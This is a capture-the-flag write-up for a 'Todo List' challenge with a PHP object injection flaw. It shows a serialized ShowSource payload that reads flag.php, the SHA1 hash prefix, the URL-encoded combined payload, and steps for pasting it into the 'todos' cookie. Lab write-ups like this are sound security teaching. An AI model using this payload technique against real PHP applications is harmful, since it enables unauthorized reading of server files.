
## Todo List

![img](https://i.ibb.co/dQBGxXC/image.png)

## Solution:

This challenge contains the PHP Object Injection vulnerability which allows attacker to modify the object. Your task is to modify the object which will be stored as a cookie when you add any task in the list. You will get basic payload creation idea if you see the provided PHP code carefully.

### Payload Creation


Step 1 - Basic payload to read flag.php
```
a:1:{i:1;O:10:"ShowSource":1:{s:6:"source";s:8:"flag.php";}}
```
\

Step 2 - Getting SHA1 hash of above payload

![img](https://i.ibb.co/LvRRknh/Screenshot-from-2022-03-21-17-03-55.png)

\

Step 3 - Encoding the basic payload

![img](https://i.ibb.co/Ws1zmtn/Screenshot-from-2022-03-21-17-11-21.png)

\

Step 4 - Concatenating generated `Hash` and `Encoded Basic Payload` together.

```
168ebef72875ddf6d6e4ac71f87a4bb2be6b5373a%3A1%3A%7Bi%3A1%3BO%3A10%3A%22ShowSource%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D
```

### Payload Injection

Step 1 - Just add any random task in todo list


Step 2 - Go to cookies section by inspecting the page

![img](https://i.ibb.co/y0GRyLp/Screenshot-from-2022-03-21-16-53-55.png)

\

Step 3 - Edit `todos` cookie value and paste our payload and refresh the page.

![img](https://i.ibb.co/4K80Nxm/Screenshot-from-2022-03-21-17-19-23.png)
